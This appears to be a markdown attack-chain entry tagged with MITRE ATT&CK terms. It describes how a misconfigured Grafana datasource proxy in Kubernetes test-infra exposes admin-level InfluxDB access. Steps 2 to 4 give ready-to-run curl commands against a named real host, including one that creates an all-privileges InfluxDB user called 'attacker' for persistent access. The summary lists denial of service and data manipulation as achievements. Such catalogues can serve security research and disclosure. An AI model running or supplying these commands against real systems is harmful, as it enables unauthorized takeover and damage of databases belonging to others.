---
tags:
  - improper-authorization
  - grafana
  - influxdb
  - kubernetes
  - misconfiguration
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
verified: false
platforms:
  - Web
  - Kubernetes
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Access-Grafana-Dashboard-and-Observe-Proxy-Requests]]'
  - '[[procedures/Test-Datasource-Configuration-for-Elevated-Privileges]]'
  - '[[procedures/Exploit-Admin-Access-to-Create-New-Admin-User]]'
  - '[[procedures/Confirm-Admin-Permissions-on-InfluxDB]]'
step_count: 4
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:28:51.900Z'
description: >-
  Multi-stage attack exploiting improper authorization in Grafana's InfluxDB
  datasource configuration within Kubernetes test-infra, allowing admin-level
  access to InfluxDB via proxied queries.
skill_level: intermediate
impact_level: high
id: f6670f92-eb99-4ab2-9dae-38479f9d5c3f
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Valid Accounts]]'
---
# Grafana Datasource Misconfiguration Leading to InfluxDB Admin Access

Multi-stage attack chain demonstrating exploitation of improper authorization in the Grafana datasource configuration within Kubernetes test-infra. The attack leverages a public-facing Grafana dashboard to proxy unauthorized admin-level queries to an InfluxDB backend, enabling full control over the database including user creation, database manipulation, and denial-of-service attacks.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Access Grafana Dashboard] --> B[Test Datasource Privileges]
    B --> C[Create Admin User]
    C --> D[Confirm and Exploit Access]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Web browser with developer tools (e.g., Chrome DevTools for network monitoring)

### Target Environment

- Kubernetes cluster with exposed Grafana dashboard (e.g., http://velodrome.k8s.io/)
- InfluxDB service integrated via Grafana datasource
- Network access to the public Grafana endpoint

### Initial Access Requirements

- No credentials required; public-facing Grafana dashboard
- Ability to send HTTP requests to Grafana proxy endpoints
- Basic knowledge of InfluxQL for query crafting

## Detailed Attack Procedures

### Step 1: Access Grafana Dashboard and Observe Proxy Requests
procedure: [[procedures/Access-Grafana-Dashboard-and-Observe-Proxy-Requests]]

**Objective**: Gain initial access to the Grafana interface and identify proxied requests to the InfluxDB backend.

**Instructions**: Open the Grafana dashboard in a web browser and use developer tools to monitor network traffic. Navigate to metric visualizations to trigger proxy requests.

**Expected Output**: Network logs showing GET requests to /api/datasources/proxy/4/query with InfluxQL parameters.

**Success Indicators**:
- Grafana dashboard loads successfully
- Proxy requests to InfluxDB observed in network tab

### Step 2: Test Datasource Configuration for Elevated Privileges
procedure: [[procedures/Test-Datasource-Configuration-for-Elevated-Privileges]]

**Objective**: Verify if the proxied datasource uses admin privileges by sending custom queries.

**Instructions**: Use the browser's developer console or a tool like curl to send a test InfluxQL query via the proxy endpoint. For example, execute [[commands/influxql-flake-rate-query]] to observe normal access, then attempt a privileged query like SHOW USERS.

```bash
curl "http://velodrome.k8s.io/api/datasources/proxy/4/query?db=metrics&q=SELECT%201-(sum(%22consistent_builds%22)/sum(%22builds%22))%20FROM%20%22flakes_daily%22%20WHERE%20time%20%3E%20now()%20-%2030d%20AND%20%22job%22%20%3D~%20/%5E(pr:pull-kubernetes-kubemark-e2e-gce-big%7Cpr:pull-kubernetes-bazel-build%7Cpr:pull-kubernetes-bazel-test%7Cpr:pull-kubernetes-dependencies%7Cpr:pull-kubernetes-e2e-gce%7Cpr:pull-kubernetes-e2e-gce-100-performance%7Cpr:pull-kubernetes-e2e-kind%7Cpr:pull-kubernetes-integration%7Cpr:pull-kubernetes-node-e2e%7Cpr:pull-kubernetes-typecheck%7Cpr:pull-kubernetes-verify)%24/%20group%20by%20job%2C%20time(20m)%20fill(none)&epoch=ms"
```

If successful, escalate to admin checks.

**Expected Output**: JSON response with metrics data, indicating proxy functionality.

**Success Indicators**:
- Query executes without authentication errors
- Response contains expected InfluxDB data

### Step 3: Exploit Admin Access to Create New Admin User
procedure: [[procedures/Exploit-Admin-Access-to-Create-New-Admin-User]]

**Objective**: Leverage confirmed admin privileges to create a new administrative user in InfluxDB.

**Instructions**: Craft and send an InfluxQL CREATE USER query via the proxy endpoint using curl or similar. Use [[commands/influxdb-create-admin-user]] to execute the creation.

```bash
curl "http://velodrome.k8s.io/api/datasources/proxy/4/query?db=metrics&q=CREATE%20USER%20%22attacker%22%20WITH%20PASSWORD%20%27weakpass%27%20WITH%20ALL%20PRIVILEGES"
```

**Expected Output**: Success message or empty response indicating user creation.

**Success Indicators**:
- No permission denied error
- Subsequent login possible with new credentials (if direct access available)

### Step 4: Confirm Admin Permissions
procedure: [[procedures/Confirm-Admin-Permissions-on-InfluxDB]]

**Objective**: Validate admin-level access by listing all databases.

**Instructions**: Send a SHOW DATABASES query via the proxy using [[commands/influxdb-show-databases]].

```bash
curl "http://velodrome.k8s.io/api/datasources/proxy/4/query?db=metrics&q=SHOW%20DATABASES"
```

**Expected Output**: JSON list of all InfluxDB databases, including internal ones.

**Success Indicators**:
- Full list of databases returned
- Access to sensitive or all databases confirmed

## Attack Chain Summary

### Key Achievements

1. Identified and accessed public Grafana proxy to InfluxDB
2. Confirmed admin privileges through custom queries
3. Created persistent admin user for ongoing access
4. Validated full control, enabling DoS or data manipulation

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Valid Accounts]]

### MITRE ATT&CK Tactics

- [[Initial Access]]

---

*Last updated: 2023-10-01T00:00:00Z*
